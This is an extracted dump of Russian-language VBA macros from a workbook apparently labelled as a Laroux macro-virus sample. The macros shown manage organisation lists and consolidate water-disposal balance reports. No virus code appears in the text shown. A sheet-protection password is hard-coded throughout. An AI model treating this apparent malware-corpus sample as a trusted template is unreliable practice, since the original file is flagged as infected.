'        SvCom.Range("G" & CurRow) = num_com        ' номер в рамках МО
'        SvCom.Range("H" & CurRow) = Trim(AtCom.Range("C" & (4 + i)).Value) ' комментарий
'        num_com = num_com + 1
'        CurRow = CurRow + 1
'        SvCom.Range("B1").Value = SvCom.Range("B1").Value + 1
'    End If
'Next
'
'If FlagNalichCom = True Then
'    SvCom.Range("E" & CurRow - num_com + 1 & ":E" & CurRow - 1).Merge
'    SvCom.Range("F" & CurRow - num_com + 1 & ":F" & CurRow - 1).Merge
'    SvCom.Range("E" & CurRow - num_com + 1 & ":E" & CurRow - 1) = MO     ' МО
'    SvCom.Range("F" & CurRow - num_com + 1 & ":F" & CurRow - 1) = OKTMO  ' ОКТМО
'    SvCom.Range("C" & CurRow - num_com + 1).Value = num_com - 1
'End If
'SvCom.Protect DrawingObjects:=False, Password:="aq1sw2de3", AllowFormattingColumns:=True, AllowFormattingRows:=True
'
'End Sub

-------------------------------------------------------------------------------
VBA MACRO AddUpdOrg.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/AddUpdOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AddOrg(NUM_ROW As Integer)
Dim ws1 As Worksheet
Dim ws2 As Worksheet

Dim ws4 As Worksheet
'Dim ws5 As Worksheet
'Dim ws6 As Worksheet

Dim i As Integer
Dim col_org As Integer
Dim NUM_COL As Integer
Dim FormAd As String

Set wb = Application.ActiveWorkbook
Set ws_diap = wb.Sheets("Диапазоны")

Set ws1 = wb.Sheets(sh1)
Set ws2 = wb.Sheets(sh2)

Set ws4 = wb.Sheets(sh4)
'Set ws5 = wb.Sheets(sh5)
'Set ws6 = wb.Sheets(sh6)

If ws1.Range("B1").Value = 1 Then
    'If FROM_REESTR(ws1.Range("I7").Value) = True Then
        FormReestr.Show
    'End If
End If
'i = 6222
'Application.ScreenUpdating = True
'Application.Wait (Now + TimeValue("0:00:5"))
FormOrg.Show
Application.ScreenUpdating = True
If flag = True Then
    col_org = ws1.cells(1, 1).Value
    NUM_COL = NUM_ROW - 2
            
    Application.ScreenUpdating = False
    
    ' Список организаций
    ws1.Rows((NUM_ROW) & ":" & (NUM_ROW)).Insert
    ws1.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
    ws_diap.Activate
    ws_diap.Range("ADD_1").Copy
    ws1.Select
                                
    ws1.cells(NUM_ROW, 4).Select
    ws1.Paste
    ws1.cells(NUM_ROW, 6).Select
            
    col_org = col_org + 1
            
    ws1.cells(1, 1).Value = col_org
             
    ws1.Range("G" & NUM_ROW).Value = PerConst.inn
    ws1.Range("H" & NUM_ROW).Value = PerConst.kpp
    ws1.Range("I" & NUM_ROW).Value = PerConst.org
    
    
    ws1.Range("J" & NUM_ROW).Value = PerConst.pr_fil
    ws1.Range("K" & NUM_ROW).Value = PerConst.fil
    ws1.Range("L" & NUM_ROW).Value = PerConst.vprod
    
    ws1.Range("M" & NUM_ROW).Value = PerConst.od
    ws1.Range("N" & NUM_ROW).Value = PerConst.nds
    
    
        ' Баланс
    ws2.Rows((NUM_ROW) & ":" & (NUM_ROW)).Insert
    ws2.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
    ws_diap.Activate
    ws_diap.Range("ADD_2").Copy
    ws2.Select
                                
    ws2.cells(NUM_ROW, 5).Select
    ws2.Paste
    ws2.cells(NUM_ROW, 6).Select
        
    ' Смета
    ws4.Columns(NUM_COL).Insert
    ws_diap.Activate
    ws_diap.Range("ADD_3").Copy
    ws4.Select
    ws4.cells(8, NUM_COL).Select
    ws4.Paste
    
    FormAd = "=Баланс!R[" & (1 + col_org) & "]C[" & (-2 - col_org) & "]"
    ws4.cells(11, NUM_COL).FormulaR1C1 = FormAd
    
    ws4.Columns(NUM_COL).ColumnWidth = 35
    ws4.Rows("9:9").EntireRow.AutoFit
    
'        ' т и н
'
'        ws5.Activate
'        ws5.Rows(NUM_ROW).Insert Shift:=xlDown
'        ws_diap.Activate
'        ws_diap.Range("ADD_5").Copy
'        ws5.Select
'        ws5.cells(NUM_ROW, 1).Select
'        ws5.Paste
'        ws5.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
'
'      ' Перекрестное субсидирование
'
'        ws6.Activate
'        ws6.Rows(NUM_ROW).Insert Shift:=xlDown
'        ws_diap.Activate
'        ws_diap.Range("ADD_6").Copy
'        ws6.Select
'        ws6.cells(NUM_ROW, 1).Select
'        ws6.Paste
'        ws6.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit

    
    
    
End If
       
Exit Sub

End Sub
' ОСТАНОВИЛСЯ
Public Sub UpdOrg(NUM_ROW As Integer, VD As String)
Dim ws1 As Worksheet
Dim ws2 As Worksheet

Dim ws4 As Worksheet

Dim i As Integer
Dim col_org As Integer
Dim NUM_COL As Integer
Dim FormAd As String


Set wb = Application.ActiveWorkbook
Set ws_diap = wb.Sheets("Диапазоны")

Set ws1 = wb.Sheets(sh1)
Set ws2 = wb.Sheets(sh2)

Set ws4 = wb.Sheets(sh4)
    PerConst.inn = ws1.Range("G" & NUM_ROW).Value
    PerConst.kpp = ws1.Range("H" & NUM_ROW).Value
    PerConst.org = ws1.Range("I" & NUM_ROW).Value
    
    PerConst.pr_fil = ws1.Range("J" & NUM_ROW).Value
    PerConst.fil = ws1.Range("K" & NUM_ROW).Value
    PerConst.vprod = ws1.Range("L" & NUM_ROW).Value
    
    PerConst.od = ws1.Range("M" & NUM_ROW).Value
    PerConst.nds = ws1.Range("N" & NUM_ROW).Value
    
FormOrg.Show
If flag = True Then
    col_org = ws1.cells(1, 1).Value
    NUM_COL = NUM_ROW - 2
    Application.ScreenUpdating = False
    ws1.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
             
    ws1.Range("G" & NUM_ROW).Value = PerConst.inn
    ws1.Range("H" & NUM_ROW).Value = PerConst.kpp
    ws1.Range("I" & NUM_ROW).Value = PerConst.org
    ws1.Range("L" & NUM_ROW).Value = PerConst.vprod
    ws1.Range("J" & NUM_ROW).Value = PerConst.pr_fil
    ws1.Range("K" & NUM_ROW).Value = PerConst.fil
    ws1.Range("M" & NUM_ROW).Value = PerConst.od
    ws1.Range("N" & NUM_ROW).Value = PerConst.nds
    
           
                    
        ws2.Activate
        ws2.cells(NUM_ROW, 9).Select
        ' Баланс передача
        ' Смета
        ws4.Columns(NUM_COL).ColumnWidth = 35
        ws4.Rows("9:9").EntireRow.AutoFit
End If
       
Exit Sub

End Sub



-------------------------------------------------------------------------------
VBA MACRO Лист4.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PerConst.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/PerConst'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const sh1 = "Список организаций"
Public Const sh2 = "Баланс"
Public Const sh3 = "Смета"
Public Const sh4 = "Смета"
'Public Const sh5 = "Тарифы и надбавки"
'Public Const sh6 = "Перекрестное субсидирование"

Public org As Variant
Public pr_fil As Variant
Public fil As Variant
Public inn As Variant
Public kpp As Variant
Public vprod As Variant
Public od As Variant
Public nds As Variant

Public flag As Boolean

Public FlagAdd As Boolean ' изменение(TRUE)/добавление(FALSE)


Public Const cod_sh As String = "BALANCE.VODOOTV.2008.FACT"
Public Propusk As String

Public Otkl As Boolean ' переменная для констатации заменять все строки или нет
Public Rezult As String



-------------------------------------------------------------------------------
VBA MACRO Лист12.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист5.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист8.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO reestr.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/reestr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' выбор МР/МО
Public Sub OKTMO_MO_NEW()
Dim i1 As Integer
Dim i2 As Integer
Dim r As Range
Dim i As Integer
Dim k As Integer

Dim ws_r As Worksheet
Set ws_r = ActiveWorkbook.Sheets("REESTR")
i1 = ws_r.cells(1, 10)
i2 = ws_r.cells(1, 11)
ws_r.Range("X2:Y63000").ClearContents
    ActiveWorkbook.Sheets("Инструкция").Activate
If i1 = 0 And i2 = 0 Then
    Set r = ws_r.Range("X2")
    r.name = "MO_LIST1"
    FormRegion.Hide
Else
    k = 2
    For i = 2 To 2 + i2 - i1
        If IsEmpty(ws_r.Range("M" & (i))) = True Then ' 02.04
            Exit For
        ElseIf Not (ws_r.Range("M" & i).Value = ws_r.Range("M" & (i + 1)).Value And ws_r.Range("N" & i).Value = ws_r.Range("N" & (i + 1)).Value) Then
            ws_r.Range("X" & k).Value = ws_r.Range("M" & i).Value
            ws_r.Range("Y" & k).Value = ws_r.Range("N" & i).Value
            k = k + 1
        End If
    Next
    
    Set r = ws_r.Range("X2:X" & k - 1)
    r.name = "MO_LIST1"
    FormRegion.Hide
End If

    
End Sub

' формирование списка ОРГАНИЗАЦИЙ данного региона
Public Function FROM_REESTR(REG As String) As Boolean
Dim i As Integer
Dim i1 As Integer
Dim i2 As Integer
Dim r As Range
Dim R1 As Range
Dim R2 As Range

Dim count_row As Integer
Dim ws As Worksheet

i1 = 0
Set ws = ActiveWorkbook.Sheets("REESTR")

For i = 20000 To 2 Step -1
    If Len(ws.cells(i, 1).Value) > 0 Then
        count_row = i
        Exit For
    End If
Next

ws.Range("M2:W63000").ClearContents ' 02.04
' поиск всех организаций региона
For i = 2 To count_row
    If ws.cells(i, 11).Value = REG Then ' 02.04
        i1 = i
        While (ws.cells(i, 11).Value = REG) ' 02.04
            i = i + 1
        Wend
        i2 = i - 1
        Exit For
    End If
Next i

If i1 = 0 Then
    ws.cells(1, 10).Value = i1
    ws.cells(1, 11).Value = i2
    ' необходимо поставить пустые диапазоны на на МО и ОКТМО!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    ws.Range("L2:R15000").ClearContents
    Set R1 = ActiveWorkbook.Sheets("REESTR").Range("X2")
    R1.name = "MO_LIST1"
    Set R2 = ActiveWorkbook.Sheets("REESTR").Range("Y2")
    R2.name = "OKTMO_LIST1"
    ws.Range("A2:L35000").Delete Shift:=xlUp ' УдаЛЕНИЕ ЛИШНЕГО ' 02.04
    FROM_REESTR = 0
    Exit Function
End If
    ws.Activate
    ws.Range("A" & i1 & ":J" & i2).Copy ' 02.04
    ws.Range("M2").Select ' 02.04
    ws.Paste
    Set r = ws.Range("M2:T" & 2 + i2 - i1) ' 02.04
    r.name = "ORG"
    FROM_REESTR = 1
    
    ws.cells(1, 10).Value = i1
    ws.cells(1, 11).Value = i2
    
    ws.Range("A2:L35000").Delete Shift:=xlUp ' УдаЛЕНИЕ ЛИШНЕГО
    
End Function
' выбор МО
Public Sub OKTMO_FORM(MOBR As String)
Dim i As Integer
Dim i1 As Integer
Dim i2 As Integer
Dim r As Range
Dim rg As Range
Dim ws As Worksheet

Set ws = ActiveWorkbook.Sheets("REESTR")

i1 = 2
i2 = ws.Range("MO_LIST1").Rows.Count + 1

For Each rg In ws.Range("MO_LIST1").cells
    If rg.Value = MOBR Then
        i1 = rg.Row
        i = 1
        While (rg.Offset(i, 0).Value = MOBR)
            i = i + 1
        Wend
        i2 = i1 + i - 1
        Exit For
    End If
Next

Set r = ws.Range("Y" & i1 & ":Y" & i2)
r.name = "OKTMO_LIST1"

End Sub

' выгрузка данных из реестра только указанного МО
Public Function FROM_REESTR_WITH_MO(mo As String, oktmo As String) As Boolean
Dim i As Integer
Dim i1 As Integer
Dim i2 As Integer
Dim r As Range
Dim R1 As Range
Dim R2 As Range

Dim count_row As Integer
Dim ws As Worksheet

i1 = 0
Set ws = ActiveWorkbook.Sheets("REESTR")

For i = 5000 To 2 Step -1
    If Len(ws.cells(i, 12).Value) > 0 Then
        count_row = i
        Exit For
    End If
Next

'ws.Range("L2:S63000").ClearContents
' поиск всех организаций региона
For i = 2 To count_row
    If ws.cells(i, 12).Value = mo And ws.cells(i, 13).Value = oktmo Then
        i1 = i
        While (ws.cells(i, 12).Value = mo And ws.cells(i, 13).Value = oktmo)
            i = i + 1
        Wend
        i2 = i - 1
        Exit For
    End If
Next i

If i1 = 0 Then
    'ws.cells(1, 10).Value = i1
    ws.cells(2, 11).Value = i2
    ' необходимо поставить пустые диапазоны на на МО и ОКТМО!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    'ws.Range("L2:R15000").ClearContents
    Set R1 = ActiveWorkbook.Sheets("REESTR").Range("J2")
    R1.name = "MO_LIST_ORG"
        
    FROM_REESTR_WITH_MO = 0
    Exit Function
End If
    'ws.Activate
    'ws.Range("N" & i1 & ":S" & i2).Copy
    'ws.Range("L2").Select
    'ws.Paste
    Set r = ws.Range("N" & i1 & ":S" & i2)
    r.name = "MO_LIST_ORG"
    FROM_REESTR_WITH_MO = 1
    
    'ws.Range("A2:S35000").ClearContents ' УдаЛЕНИЕ ЛИШНЕГО
    
End Function
-------------------------------------------------------------------------------
VBA MACRO allCheck.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/allCheck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Base 1
Public fl As Boolean
Public fl3 As Boolean
Public fl_kpp As Boolean

Function InnCh(inn As String) As Boolean

Dim i As Integer
Dim fl1 As Boolean

If Len(inn) > 12 Or Len(inn) < 10 Then
    fl1 = True
    GoTo NS_
End If

For i = 1 To Len(inn)
    If Mid(inn, i, 1) < "0" Or Mid(inn, i, 1) > "9" Then
        fl1 = True
        GoTo NS_
    End If
Next

NS_:
If fl1 = True Then
    InnCh = False
    Exit Function
End If

InnCh = True
End Function

Function KppCh(kpp As String) As Boolean

Dim i As Integer
Dim fl1 As Boolean

fl1 = False

If Len(kpp) <> 9 Then
    fl1 = True
    GoTo NS_
End If

If Len(kpp) > 0 Then
    For i = 1 To Len(kpp)
      If Mid(kpp, i, 1) < "0" Or Mid(kpp, i, 1) > "9" Then
        fl1 = True
        GoTo NS_
      End If
    Next
End If

NS_:
If fl1 = True Then
    KppCh = False
    Exit Function
End If

KppCh = True
End Function
Function rrt() As String

Dim i As Integer
Dim wb As Workbook
Dim ws2 As Worksheet
Dim cl As Range
Dim rg As Range
Set wb = Application.ActiveWorkbook
Set ws2 = wb.Worksheets("Мероприятия")

ws2.Activate
For Each cl In ws2.Range("F26:I" & (ws2.Range("RANGE1").Row - 1))
If ws2.Range("D" & cl.Row).Value = "Удалить мероприятие" Then
    If IsEmpty(cl.cells(1, 1)) Or Not (Len(cl.cells(1, 1).Value) > 0) Then
        ws2.Activate
        cl.cells(1, 1).Select
        checkBeforSave1 = cl.Address
        Exit Function
    End If
End If
Next

For Each cl In ws2.Range("AB26:AB" & (ws2.Range("RANGE1").Row - 1))
If cl.Interior.ColorIndex = 34 Then
    If IsEmpty(cl.cells(1, 1)) Or Not (Len(cl.cells(1, 1).Value) > 0) Then
        ws2.Activate
        cl.cells(1, 1).Select
        checkBeforSave1 = cl.Address
        Exit Function
    End If
End If
Next

End Function

Function OktmoCh(oktmo As String) As Boolean

Dim i As Integer
Dim fl1 As Boolean

If Len(oktmo) > 8 Or Len(oktmo) < 7 Then
    fl3 = True
    GoTo NS_
End If

For i = 1 To Len(oktmo)
    If Mid(oktmo, i, 1) < "0" Or Mid(oktmo, i, 1) > "9" Then
        fl3 = True
        GoTo NS_
    End If
Next

NS_:
If fl3 = True Then
    OktmoCh = False
    Exit Function
End If

OktmoCh = True
End Function
-------------------------------------------------------------------------------
VBA MACRO SVOD.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/SVOD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Option Base 1
Public NUM_REZ As Long
Public open_flag As Boolean

' функция проверки на наличие всех листов
Public Function NalichAllSheets(ARR_SH() As String, wb As Workbook) As String
NalichAllSheets = ""

Dim sh As Worksheet
Dim i As Integer

For i = LBound(ARR_SH) To UBound(ARR_SH)
    On Error GoTo err
    wb.Sheets(ARR_SH(i)).Activate
Next

Exit Function
err:
    NalichAllSheets = ARR_SH(i)
End Function
' УДАЛЕНПИЕ ВСЕГО ДОБАВЛЕННОГО ДЛЯ ТЕСТА
Public Sub test_DELETE()
Dim col_org As Integer
Dim i As Integer

Sheets("Баланс").Unprotect "aq1sw2de3"
Sheets("Смета").Unprotect "aq1sw2de3"
Sheets("Список организаций").Unprotect "aq1sw2de3"

col_org = Sheets("Список организаций").Range("A1").Value
    
For i = 1 To col_org
    Sheets("Смета").Columns("K:K").Delete Shift:=xlToLeft
    Sheets("Баланс").Rows("13:13").Delete Shift:=xlUp
    Sheets("Список организаций").Rows("13:13").Delete Shift:=xlUp
    Sheets("Баланс").Columns("R:R").Delete Shift:=xlToLeft
    
Next

    Sheets("Список организаций").Range("A1").FormulaR1C1 = "0"
End Sub
' функция для формирования списка всех файлов данной папки
Function SpisokFiles(FR As Range) As Boolean
'On Error GoTo end_

SpisokFiles = False

Dim s As FileSearch
Dim pth As String
Dim i As Integer
Dim ws_diap As Worksheet
Dim rg As Range
Dim count_1 As Integer

Dim WB_SV As Workbook
Dim WB_AT As Workbook

Set WB_SV = Application.ActiveWorkbook
Set ws_diap = WB_SV.Sheets("Диапазоны")

ws_diap.Columns(1).ClearContents
FR.Worksheet.Activate
FR.cells(1, 1).Offset(2, 0).Select
Selection.ClearContents


If Len(FR.cells(1, 1).Value) < 4 Then
    Set rg = ws_diap.Range("B1")
    rg.name = "ALL_FILES"
    FR.cells(1, 1).Offset(2, 0).Value = rg.cells(1, 1).Value
    MsgBox "Количество символов в названии папки должно превышать 3!", vbCritical
    FR.Select
Else
    ' можно, например, проверку сделать на pth (на / в конце)
    pth = FR.Value
    
    Set s = Application.FileSearch
    With s
        .NewSearch
        .LookIn = pth
        .SearchSubFolders = True
        .MatchTextExactly = True
        .FileName = "*.xls"
        If .Execute() > 0 Then
            count_1 = .FoundFiles.Count
            For i = 1 To count_1
                ws_diap.cells(i, 1).Value = .FoundFiles.Item(i)
            Next i
            Set rg = ws_diap.Range("A1:A" & count_1)
            rg.name = "ALL_FILES"
            MsgBox "Список файлов сформирован! Смотрите яч. 'H12'!", vbInformation
        Else
            MsgBox "В указанной папке ни одного файла не найдено!", vbInformation
            Set rg = ws_diap.Range("B1")
            rg.name = "ALL_FILES"
            FR.cells(1, 1).Offset(2, 0).Value = rg.cells(1, 1).Value
            Exit Function
        End If
    End With
End If

Exit Function
'end_:

End Function

 ' \\ процедура удаления ОРГ \\
Public Sub DelOrg(NUM_ROW As Integer)

Dim Sv(5) As Worksheet
Dim WB_SV As Workbook
Dim NUM_COL As Integer

NUM_COL = NUM_ROW - 2

Set WB_SV = Application.ThisWorkbook

Set Sv(1) = WB_SV.Sheets(sh1)
Set Sv(2) = WB_SV.Sheets(sh2)
Set Sv(3) = WB_SV.Sheets(sh4)
'Set Sv(4) = WB_SV.Sheets(sh5)
'Set Sv(5) = WB_SV.Sheets(sh6)

Sv(1).Unprotect "aq1sw2de3"
Sv(2).Unprotect "aq1sw2de3"
Sv(3).Unprotect "aq1sw2de3"
'Sv(4).Unprotect "aq1sw2de3"
'Sv(5).Unprotect "aq1sw2de3"

WB_SV.Activate
Sv(1).Activate
        Sv(1).Rows(NUM_ROW).Delete
        Sv(1).cells(NUM_ROW - 1, 5).Select
        ' Баланс
        Sv(2).Rows(NUM_ROW).Delete
        ' Смета
        Sv(3).Columns(NUM_COL).Delete
'        'Тарифы и надбавки
'        Sv(4).Rows(NUM_ROW).Delete
'        'ПС
'        Sv(5).Rows(NUM_ROW).Delete
        Sv(1).cells(1, 1).Value = Sv(1).cells(1, 1).Value - 1
        
End Sub

' ДОБАВЛЕНИЕ строк при своде
Public Sub AddOrg_from_MO(NUM_ROW As Integer)
Dim ws1 As Worksheet
Dim ws2 As Worksheet

Dim ws4 As Worksheet
Dim ws5 As Worksheet
Dim ws6 As Worksheet

Dim ws_diap As Worksheet

Dim wb As Workbook

Dim i As Integer
Dim col_org As Integer
Dim NUM_COL As Integer
Dim FormAd As String

Set wb = Application.ThisWorkbook
Set ws_diap = wb.Sheets("Диапазоны")

Set ws1 = wb.Sheets(sh1)
Set ws2 = wb.Sheets(sh2)
Set ws4 = wb.Sheets(sh4)
'Set ws5 = wb.Sheets(sh5)
'Set ws6 = wb.Sheets(sh6)

wb.Activate

'Application.ScreenUpdating = True

    col_org = ws1.cells(1, 1).Value
    NUM_COL = NUM_ROW - 2
    
    ' список организаций
            
    'Application.ScreenUpdating = False
    ws1.Unprotect ("aq1sw2de3")
    ws1.Rows((NUM_ROW) & ":" & (NUM_ROW)).Insert
    ws1.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
    ws_diap.Activate
    ws_diap.Range("ADD_1").Copy
    ws1.Select
                                
    ws1.cells(NUM_ROW, 4).Select
    ws1.Paste
    ws1.cells(NUM_ROW, 6).Select
            
    col_org = col_org + 1
            
    ws1.cells(1, 1).Value = col_org
             
    ws1.Range("G" & NUM_ROW).Value = PerConst.inn
    ws1.Range("H" & NUM_ROW).Value = PerConst.kpp
    ws1.Range("I" & NUM_ROW).Value = PerConst.org

    ws1.Range("J" & NUM_ROW).Value = PerConst.pr_fil
    ws1.Range("K" & NUM_ROW).Value = PerConst.fil
    ws1.Range("L" & NUM_ROW).Value = PerConst.vprod

    ws1.Range("M" & NUM_ROW).Value = PerConst.od
    ws1.Range("N" & NUM_ROW).Value = PerConst.nds
    
    
        ' Баланс
        ws2.Unprotect ("aq1sw2de3")
        ws2.Activate
        ws2.Rows(NUM_ROW).Insert Shift:=xlDown
        ws_diap.Activate
        ws_diap.Range("ADD_2").Copy
        ws2.Activate
        ws2.cells(NUM_ROW, 5).Select
        ws2.Paste
        ws2.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit

        ws2.cells(NUM_ROW, 9).Select
        
    ' Смета
    ws4.Unprotect "aq1sw2de3"
    ws4.Columns(NUM_COL).Insert
    ws_diap.Activate
    ws_diap.Range("ADD_3").Copy
    ws4.Select
    ws4.cells(8, NUM_COL).Select
    ws4.Paste
    
    FormAd = "=Баланс!R[" & (1 + col_org) & "]C[" & (-2 - col_org) & "]"
    ws4.cells(11, NUM_COL).FormulaR1C1 = FormAd
    
    ws4.Columns(NUM_COL).ColumnWidth = 35
    ws4.Rows("9:9").EntireRow.AutoFit
    
'    ' т и н
'    ws5.Unprotect "aq1sw2de3"
'    ws5.Activate
'    ws5.Rows(NUM_ROW).Insert Shift:=xlDown
'    ws_diap.Activate
'    ws_diap.Range("ADD_5").Copy
'    ws5.Select
'    ws5.cells(NUM_ROW, 1).Select
'    ws5.Paste
'    ws5.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
'
'    ' Перекрестное субсидирование
'    ws6.Unprotect "aq1sw2de3"
'    ws6.Activate
'    ws6.Rows(NUM_ROW).Insert Shift:=xlDown
'    ws_diap.Activate
'    ws_diap.Range("ADD_6").Copy
'    ws6.Select
'    ws6.cells(NUM_ROW, 1).Select
'    ws6.Paste
'    ws6.Rows((NUM_ROW) & ":" & (NUM_ROW)).EntireRow.AutoFit
       

End Sub
' НУМЕРАЦИЯ СТРОК ПРИ СВОДЕ
Public Sub NumStrok_from_MO()
Dim i As Integer

Dim ws1 As Worksheet
Dim ws2 As Worksheet
Dim ws4 As Worksheet
'Dim ws5 As Worksheet
'Dim ws6 As Worksheet

Set ws1 = ThisWorkbook.Sheets(sh1)
Set ws2 = ThisWorkbook.Sheets(sh2)
Set ws4 = ThisWorkbook.Sheets(sh4)
'Set ws5 = ThisWorkbook.Sheets(sh5)
'Set ws6 = ThisWorkbook.Sheets(sh6)

ws1.Unprotect "aq1sw2de3"
ws2.Unprotect "aq1sw2de3"
ws4.Unprotect "aq1sw2de3"
'ws5.Unprotect "aq1sw2de3"
'ws6.Unprotect "aq1sw2de3"

Dim index As Integer
index = 1
For i = 13 To 12 + ws1.cells(1, 1).Value
    If InStr(1, ws1.cells(i, 5).Value, "Удалить") > 0 Then
          ' Список организаций
          ws1.cells(i, 6).Value = index
          ' Баланс
          'ws2.cells(8, i + 5).Value = index
          ws2.cells(i, 6).Value = index
          ws2.cells(i, 7).Value = ws1.cells(i, 9).Value
          'ws2.cells(9, i + 5).Value = ws1.cells(i, 9).Value
          
          ' Смета
          ws4.cells(8, i - 2).Value = ws1.cells(i, 6).Value
          ws4.cells(9, i - 2).Value = ws1.cells(i, 9).Value
          ws4.cells(10, i - 2).Value = ws1.cells(i, 14).Value
          
'          ' Т и н
'          ws5.cells(i, 5).Value = ws1.cells(i, 14).Value
'          ws5.cells(i, 6).Value = index
'          ws5.cells(i, 7).Value = ws1.cells(i, 9).Value
'
'          ' Перекрестное c
'          ws6.cells(i, 5).Value = ws1.cells(i, 14).Value
'          ws6.cells(i, 6).Value = index
'          ws6.cells(i, 7).Value = ws1.cells(i, 9).Value
          
          index = index + 1
    End If
Next

ws1.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

ws2.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

ws4.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
'ws5.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
'        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
'ws6.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
'        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
End Sub



' последовательное открытие всех файлов, находящихся в указанной директории на листе "Список организаций"
Public Sub LOAD_FILES()

Dim ws_sp As Worksheet
Dim ws_rez As Worksheet

Dim pth As String

Dim i As Long
Dim j As Integer

Dim WB_SV As Workbook
Dim WB_AT As Workbook

Set WB_SV = Application.ActiveWorkbook
Set ws_sp = WB_SV.Sheets(sh1)
Set ws_rez = WB_SV.Sheets("Ошибки загрузки")

pth = WB_SV.Sheets("Свод").Range("Papka").cells(1, 1).Value ' наименование папки с шаблонами

open_flag = False ' флаг ????

' ОЧИЩАЕМ ЛИСТ Ошибки загрузки

ws_rez.Unprotect "aq1sw2de3"
ws_rez.Range("A2:C65000").ClearContents
j = 2
Dim name_file As String

' ПОИСК
With Application.FileSearch
    .NewSearch
    .LookIn = pth
    .SearchSubFolders = True
    .FileName = "*.xls"
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    If .Execute() > 0 Then
         FormPropusk.Show
        For i = 1 To .FoundFiles.Count
            On Error GoTo ErrOpen_
            name_file = .FoundFiles.Item(i)
            If InStr(1, name_file, "\" & ThisWorkbook.name) > 0 Then
                ws_rez.Unprotect "aq1sw2de3"
                ws_rez.cells(j, 1).Font.Size = 9
                ws_rez.cells(j, 1).Value = name_file
                ws_rez.cells(j, 2).Value = "Нельзя одновременно открыть 2 файла с одинаковыми именами!"
                Otkl = True
                WB_SV.Activate
                ws_rez.Activate
                ws_rez.Range("A" & j & ":C" & j).Select
                ws_rez.Protect DrawingObjects:=False, Password:="aq1sw2de3", AllowFormattingColumns:=True, AllowFormattingRows:=True
                GoTo err1_
            End If
            
            Application.EnableEvents = False
            Workbooks.Open FileName:=name_file, UpdateLinks:=0
            Application.EnableEvents = True
            Set WB_AT = Application.ActiveWorkbook
             '-----Блок выполняемый в каждом файле
            Rezult = load.load_1(WB_SV, WB_AT)
            SVOD.NumStrok_from_MO
            AddHypRez WB_AT, WB_SV, Rezult, j
            If Len(Rezult) > 0 Then
                Otkl = True
                j = j + 1
            End If
            WB_SV.Activate
            '-----Конец блока
err1_:
        Next i
        
    Else
        MsgBox "В указанной папке ни одного файла не найдено!"
        Exit Sub
    End If

End With

' возвращаем защиту обратно на лист "Ошибки загрузки"
'ws_rez.Protect DrawingObjects:=False, Password:="aq1sw2de3", AllowFormattingColumns:=True, AllowFormattingRows:=True

Exit Sub
ErrOpen_:
Application.EnableEvents = True
If err.Number = 1004 Then
    MsgBox "Произошла ошибка открытия! Проверьте ни открыт ли один из шаблонов в указанной папке!"
End If

End Sub
' добавление/не добавление ГИПЕРССЫЛОК на лист "Ошибки загрузки"
Sub AddHypRez(WB_AT As Workbook, WB_SV As Workbook, Rezult As String, NumRow As Integer)

Dim name_file As String
Dim col_org As String

Dim ws_sp As Worksheet
Dim ws_rez As Worksheet

Set ws_sp = WB_SV.Sheets(sh1)
Set ws_rez = WB_SV.Sheets("Ошибки загрузки")

name_file = WB_AT.FullName
